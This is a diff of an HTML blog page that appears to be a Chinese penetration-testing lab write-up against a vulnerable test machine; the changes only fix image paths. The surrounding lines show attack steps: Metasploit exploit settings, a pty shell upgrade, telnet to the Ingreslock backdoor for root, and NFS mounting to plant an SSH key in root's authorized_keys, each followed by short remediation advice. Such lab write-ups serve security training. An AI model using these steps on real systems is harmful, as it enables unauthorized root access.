@@ -429,7 +429,7 @@ exploit
 
 python -c 'import pty;pty.spawn("/bin/bash")'		// 获取交互shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<img src="/post/undefined/1.jpg" class>
+<img src="/post/2123/1.jpg" class>
 
 <h4 id="（三）漏洞修复"><a href="#（三）漏洞修复" class="headerlink" title="（三）漏洞修复"></a>（三）漏洞修复</h4><p>1 更新为高版本</p>
 <p>2 安装相应的安全补丁</p>
@@ -462,12 +462,12 @@ set lhost  （ip address)
 
 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<img src="/post/undefined/2.jpg" class>
+<img src="/post/2123/2.jpg" class>
 
 <p>2 执行下面命令，进入交互shell</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">python -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<img src="/post/undefined/3.jpg" class>
+<img src="/post/2123/3.jpg" class>
 
 <h4 id="（三）漏洞修复-1"><a href="#（三）漏洞修复-1" class="headerlink" title="（三）漏洞修复"></a>（三）漏洞修复</h4><p>1 更新为高版本</p>
 <p>2 设置白名单，对服务器端口的访问进行限制</p>
@@ -484,7 +484,7 @@ run
 
 python -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<img src="/post/undefined/4.jpg" class>
+<img src="/post/2123/4.jpg" class>
 
 <h5 id="》》方法二：使用ftp《《"><a href="#》》方法二：使用ftp《《" class="headerlink" title="》》方法二：使用ftp《《"></a>》》方法二：使用ftp《《</h5><p>1 ftp连接</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">ftp 192.168.12.181
@@ -505,14 +505,14 @@ set lhost 192.168.12.172
 set rhosts 192.168.12.181
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<img src="/post/undefined/5.jpg" class>
+<img src="/post/2123/5.jpg" class>
 
 <h4 id="（三）漏洞修复-3"><a href="#（三）漏洞修复-3" class="headerlink" title="（三）漏洞修复"></a>（三）漏洞修复</h4><p>1 设置白名单，限制访问权限</p>
 <h3 id="五、Ingreslock后门漏洞–1524"><a href="#五、Ingreslock后门漏洞–1524" class="headerlink" title="五、Ingreslock后门漏洞–1524"></a>五、Ingreslock后门漏洞–1524</h3><h4 id="（一）漏洞描述-1"><a href="#（一）漏洞描述-1" class="headerlink" title="（一）漏洞描述"></a>（一）漏洞描述</h4><p>Ingreslock 1524端口通常关联于Ingres数据库管理系统的lock服务。Ingres是一种关系型数据库管理系统，该系统使用基于网络的通信协议与客户端应用程序进行交互。Ingreslock后门程序监听在1524端口，连接到1524端口就可以直接获得root权限。</p>
 <h4 id="（二）漏洞复现-3"><a href="#（二）漏洞复现-3" class="headerlink" title="（二）漏洞复现"></a>（二）漏洞复现</h4><p>1 直接使用telent连接获取root权限</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">telnet 192.168.12.181 1524<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<img src="/post/undefined/6.jpg" class>
+<img src="/post/2123/6.jpg" class>
 
 <h4 id="（三）漏洞修复-4"><a href="#（三）漏洞修复-4" class="headerlink" title="（三）漏洞修复"></a>（三）漏洞修复</h4><p>1 不在公网上暴露</p>
 <p>2 对该端口进行权限访问限制</p>
@@ -541,23 +541,23 @@ ssh无密码登陆。影响系统/软件
 <h4 id="（二）漏洞复现-5"><a href="#（二）漏洞复现-5" class="headerlink" title="（二）漏洞复现"></a>（二）漏洞复现</h4><p>1 查看目标主机上nfs服务是否开启</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">rpcinfo -p 192.168.12.181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<img src="/post/undefined/7.jpg" class>
+<img src="/post/2123/7.jpg" class>
 
 <p>2 显示指定的远程共享目录列表</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">showmount -e 192.168.12.181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<img src="/post/undefined/8.jpg" class>
+<img src="/post/2123/8.jpg" class>
 
 <p>3 生成rsa公钥，一路回车</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">ssh-keygen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<img src="/post/undefined/9.jpg" class>
+<img src="/post/2123/9.jpg" class>
 
 <p>3  在终端输入命令建立tool目录；将目标靶机根目录挂载到&#x2F;tmp&#x2F;tool目录下:</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">mkdir /tmp/tool
 mount -t nfs 192.168.12.181:/  /tmp/tool<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<img src="/post/undefined/10.jpg" class>
+<img src="/post/2123/10.jpg" class>
 
 <p>4 把生成的公钥追加到靶机的authorized_keys下，实现ssh免密码登录</p>
 <pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">cat  /root/.ssh/id_rsa.pub>>/tmp/tool/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -571,7 +571,7 @@ use exploit/multi/misc/java_rmi_server
 set rhosts 192.168.12.181
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<img src="/post/undefined/11.jpg" class>
+<img src="/post/2123/11.jpg" class>
 
                 
             </div>
